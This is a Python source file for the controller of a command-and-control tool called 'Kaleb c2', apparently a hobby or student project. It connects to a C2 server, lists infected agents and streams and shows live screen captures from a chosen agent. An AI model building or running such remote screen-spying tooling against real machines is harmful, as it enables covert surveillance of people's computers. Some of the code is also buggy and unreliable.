import argparse

import cv2

import client
import message
from vuls import *

parser = argparse.ArgumentParser(description='Kaleb c2 Controller.')

subparsers = parser.add_subparsers(dest="command")

getscreen_parser = subparsers.add_parser("get-screen")
getscreen_parser.add_argument('agent_name', help="for share command")

getagents_parser = subparsers.add_parser("get-agents")

parser.add_argument('--server', default='localhost',
                    help='Kaleb c2 server address')

parser.add_argument('--port', type=int, default=SERVER_PORT,
                    help='Kaleb c2 server port')

args = parser.parse_args()

done = False


# print(args.agent_name)

class Controller(client.Client):
    def __init__(self):
        super().__init__("controller")

    def do(self, cmd, agent_name=None):
        """
        match the command to the correct method
        :param cmd:
        :return:
        """
        print(agent_name)
        match cmd:
            case "get-agents":
                print(self.do_get_agents())
            case "get-screen":
                self.do_get_screen(agent_name)
            case "frame":
                self.handle_frame_response()
            case _:
                print("error")

    def do_get_screen(self, agent_name):
        global done
        if agent_name is not None:
            agent_name = agent_name.replace(" ", "")
            agent_name = agent_name[1:-1]
        else:
            agent_name = args.agent_name
        """
        makes a message from type share
        sends to the server and wait for a confirm
        :return:
        """
        msg = message.Share(agent_name)
        self.my_socket.sendall((msg.pack()))
        done = False
        self.handle_frame_response(message.recv(self.my_socket),
                                   agent_name)

    def do_get_agents(self):

        """
        send a message from get agents type
        and waits for answer
        :return:
        """

        self.send(message.GetAgents())
        response = message.recv(self.my_socket)
        agents = response.agents
        agents = str(agents)
        agents = agents[11:-2]
        agents = agents.split(',')
        return agents

    def handle_frame_response(self, response, agent_name):
        """
        show the frames that recived from server
        #todo: when to stop the share
        :param agent_name:
        :param response:
        """
        while not done:
            msg = message.Share(agent_name)
            self.my_socket.sendall((msg.pack()))
            frame = response.frame
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.namedWindow(agent_name)
            if cv2.getWindowProperty(agent_name, 0) >= 0:
                cv2.imshow(agent_name, frame)
                cv2.waitKey(1)
            else:
                cv2.imshow(agent_name, frame)
                cv2.waitKey(1)
            response = message.recv(self.my_socket)
        msg = message.StopShare(agent_name)
        self.my_socket.sendall((msg.pack()))
        cv2.destroyAllWindows()

    def stop_share(self):
        global done
        done = True


def main():
    c = Controller()
    c.connect(args.server, args.port)

    c.do(args.command)


if __name__ == '__main__':
    main()
